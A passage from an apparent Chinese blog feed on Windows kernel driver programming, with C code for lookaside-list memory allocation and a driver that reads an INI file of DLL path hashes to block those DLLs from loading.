&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>向LookAside申请内存</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">AllocateBufferFromLookAsideList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    KIRQL CurrentIrql;</span><br><span class="line">    PVOID VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == FALSE)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    CurrentIrql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">    <span class="keyword">if</span> (CurrentIrql &gt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    VirtualAddress = <span class="built_in">ExAllocateFromNPagedLookasideList</span>(&amp;__LookAsideList);</span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">RtlZeroMemory</span>(VirtualAddress, BUFFER_SIZE_MAX);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> VirtualAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>从Lookaside中释放内存</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">FreeBufferToLookAsideList</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    PVOID VirtualAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    KIRQL CurrentIrql;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == FALSE)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    CurrentIrql = <span class="built_in">KeGetCurrentIrql</span>();</span><br><span class="line">    <span class="keyword">if</span> (CurrentIrql &gt; DISPATCH_LEVEL)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExFreeToNPagedLookasideList</span>(&amp;__LookAsideList, VirtualAddress);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>释放Lookaside结构</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">UninitializeLookAsideList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (__IsLookAsideList == TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExDeleteNPagedLookasideList</span>(&amp;__LookAsideList);</span><br><span class="line">        __IsLookAsideList = FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用Lookaside内存&quot;&gt;&lt;a href=&quot;#使用Lookaside内存&quot; class=&quot;headerlink&quot; title=&quot;使用Lookaside内存&quot;&gt;&lt;/a&gt;使用Lookaside内存&lt;/h1&gt;&lt;p&gt;频繁申请和回收内存，会导致在内存上产生大量的内存“空</summary>
      
    
    
    
    <category term="Windows Kernel" scheme="https://qianmuoy.github.io/categories/Windows-Kernel/"/>
    
    
  </entry>
  
  <entry>
    <title>内核解析拦截DLL设置</title>
    <link href="https://qianmuoy.github.io/2024/03/09/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90%E6%8B%A6%E6%88%AADLL%E8%AE%BE%E7%BD%AE/"/>
    <id>https://qianmuoy.github.io/2024/03/09/%E5%86%85%E6%A0%B8%E8%A7%A3%E6%9E%90%E6%8B%A6%E6%88%AADLL%E8%AE%BE%E7%BD%AE/</id>
    <published>2024-03-09T12:38:13.000Z</published>
    <updated>2024-03-09T12:38:43.779Z</updated>
    
    <content type="html"><![CDATA[<h1 id="内核拦截DLL"><a href="#内核拦截DLL" class="headerlink" title="内核拦截DLL"></a>内核拦截DLL</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FAST_MUTEX __AntiLoadDllLock;</span><br><span class="line">PANTI_LOAD_DLL __AntiLoadDll = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function">VOID</span></span><br><span class="line"><span class="function"><span class="title">InitializeAntiLoadDll</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">ExInitializeFastMutex</span>(&amp;__AntiLoadDllLock);</span><br><span class="line">    <span class="built_in">BootReadFile</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="处理文件信息"><a href="#处理文件信息" class="headerlink" title="处理文件信息"></a>处理文件信息</h2><p>首先获取当前工作目录，然后将其与文件名 XXXX.ini 拼接起来，得到文件的路径。接着，使用 Windows API 函数 ZwCreateFile 打开文件，使用 ZwQueryInformationFile 获取文件长度，使用 ExAllocatePool 分配内存缓冲区，再使用 ZwReadFile 读取文件内容。最后，它调用 ParseAntiLoadFile 解析文件内容</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOLEAN</span></span><br><span class="line"><span class="function"><span class="title">BootReadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line">    UNICODE_STRING v1 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    HANDLE FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE_STANDARD_INFORMATION FileStandardInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    LARGE_INTEGER FileLength = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    LARGE_INTEGER ByteOffset = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PVOID VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">    WCHAR* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    BOOLEAN IsOk = FALSE;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!__WorkPath.Length)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 驱动路径</span></span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v5 = (PWCHAR)<span class="built_in">AllocateBuffer</span>(MAX_BYTE);</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 拼接出ini路径</span></span><br><span class="line">    Status = <span class="built_in">AppendWorkPath</span>(</span><br><span class="line">        v5,</span><br><span class="line">        MAX_PATH,</span><br><span class="line">        FILE_NAME,</span><br><span class="line">        <span class="built_in">WCHAR_COUNT_BY_ARRAY</span>(FILE_NAME)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (Status != STATUS_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 最终v5形如&quot;\??\C:\911kisknl64\XXXX.ini&quot;</span></span><br><span class="line">    <span class="comment">//双字转换为Unicode</span></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(</span><br><span class="line">        &amp;v1,</span><br><span class="line">        v5);</span><br><span class="line"><span class="comment">// 初始化OA</span></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        &amp;v1,</span><br><span class="line">        OBJ_CASE_INSENSITIVE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">//打开文件</span></span><br><span class="line">    Status = <span class="built_in">ZwCreateFile</span>(</span><br><span class="line">        &amp;FileHandle,</span><br><span class="line">        GENERIC_READ | SYNCHRONIZE | FILE_READ_ATTRIBUTES,</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">        FILE_OPEN,</span><br><span class="line">        FILE_RANDOM_ACCESS | FILE_COMPLETE_IF_OPLOCKED | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算文件长度</span></span><br><span class="line">    Status = <span class="built_in">ZwQueryInformationFile</span>(</span><br><span class="line">        FileHandle,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        &amp;FileStandardInfo,</span><br><span class="line">        <span class="built_in">sizeof</span>(FILE_STANDARD_INFORMATION),</span><br><span class="line">        FileStandardInformation</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    FileLength = FileStandardInfo.EndOfFile;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FileLength.QuadPart &gt; <span class="number">50</span> * <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请一个非分页内存</span></span><br><span class="line">    VirtualAddress = <span class="built_in">ExAllocatePool</span>(</span><br><span class="line">        NonPagedPool,</span><br><span class="line">        (ULONG)FileLength.LowPart + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlZeroMemory</span>(VirtualAddress, (ULONG)FileLength.LowPart + <span class="number">1</span>);</span><br><span class="line">    Status = <span class="built_in">ZwReadFile</span>(</span><br><span class="line">        FileHandle,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        VirtualAddress,</span><br><span class="line">        (ULONG)FileLength.LowPart,</span><br><span class="line">        &amp;ByteOffset,   <span class="comment">//真正读取了多少</span></span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 读出文件内容，转交ParseAntiLoadFile函数处理</span></span><br><span class="line">    IsOk = <span class="built_in">ParseAntiLoadFile</span>((LPSTR)VirtualAddress);</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeBuffer</span>(v5);</span><br><span class="line">    v5 = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExFreePool</span>(VirtualAddress);</span><br><span class="line">        VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != FileHandle)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ZwClose</span>(FileHandle);</span><br><span class="line">        FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> IsOk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="拼接文件路径"><a href="#拼接文件路径" class="headerlink" title="拼接文件路径"></a>拼接文件路径</h2><p>将GLOBAL_LINK、__WorkPath.Buffer和Name三者拼接成一个完整的路径，存储在Path变量中，并返回操作的执行状态</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">AppendWorkPath</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR* Path,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  PathLength,</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR* Name,</span></span></span><br><span class="line"><span class="params"><span class="function">    ULONG  NameLength)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS Status = STATUS_UNSUCCESSFUL;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line">    <span class="keyword">if</span> (__WorkPath.Buffer == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line">        <span class="keyword">return</span> Status;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将GLOBAL_LINK复制到Path中</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchCopyW</span>(Path, PathLength, GLOBAL_LINK);</span><br><span class="line">        Path += <span class="built_in">WCHAR_COUNT_BY_ARRAY</span>(GLOBAL_LINK);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 限制大小 将__WorkPath.Buffer拷贝到Path中</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchCopyNW</span>(Path, PathLength, __WorkPath.Buffer, __WorkPath.Length / <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">        <span class="comment">// 更新path指针位置</span></span><br><span class="line">        Path += __WorkPath.Length / <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">// 检查__WorkPath.Buffer末尾是否是&#x27;\\&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> (__WorkPath.Buffer[__WorkPath.Length / <span class="built_in">sizeof</span>(WCHAR) - <span class="number">1</span>] != <span class="string">L&#x27;\\&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 没有，加上</span></span><br><span class="line">            Status = <span class="built_in">RtlStringCchCopyNW</span>(Path, PathLength, <span class="string">L&quot;\\&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            Path++;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">// 将name变量内容也拷贝到Path中</span></span><br><span class="line">        Status = <span class="built_in">RtlStringCchCopyNW</span>(Path, PathLength, Name, NameLength);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        Status = STATUS_SUCCESS;</span><br><span class="line">    &#125; <span class="keyword">while</span> (FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__WorkPathLock);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xxxx-ini"><a href="#xxxx-ini" class="headerlink" title="xxxx.ini"></a>xxxx.ini</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[AntiLoadDll]</span><br><span class="line">Count=2;1=1111;2=2222;</span><br></pre></td></tr></table></figure><h2 id="解析对抗DLL加载"><a href="#解析对抗DLL加载" class="headerlink" title="解析对抗DLL加载"></a>解析对抗DLL加载</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> FILE_NAME           <span class="string">L&quot;XXXX.ini&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_NAME            <span class="string">&quot;[AntiLoadDll]&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUB_KEY_COUNT_NAME      <span class="string">&quot;Count=&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEPARATE_NAME       <span class="string">&quot;;&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_ANTI_LOAD_DLL_ENTRY</span></span><br><span class="line">&#123;</span><br><span class="line">    ULONG PathHash;</span><br><span class="line">&#125;ANTI_LOAD_DLL_ENTRY, *PANTI_LOAD_DLL_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_ANTI_LOAD_DLL_</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> Count;</span><br><span class="line">    ANTI_LOAD_DLL_ENTRY Entry[<span class="number">1</span>];</span><br><span class="line">&#125;ANTI_LOAD_DLL, * PANTI_LOAD_DLL;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOLEAN</span></span><br><span class="line"><span class="function"><span class="title">ParseAntiLoadFile</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in PSTR VirtualAddress</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOLEAN IsOk = FALSE;</span><br><span class="line">    PSTR v1 = <span class="literal">NULL</span>;</span><br><span class="line">    PSTR v2 = <span class="literal">NULL</span>;</span><br><span class="line">    CHAR Key[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    CHAR KeyValue[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    INT Count = <span class="number">0</span>;</span><br><span class="line">    ULONG ViewSize = <span class="number">0</span>;</span><br><span class="line">    INT i = <span class="number">0</span>;</span><br><span class="line">    ULONG PathHash = <span class="number">0</span>;   <span class="comment">// 字符串的Hash值表达   </span></span><br><span class="line">    ANSI_STRING v3;</span><br><span class="line">    UNICODE_STRING v4;</span><br><span 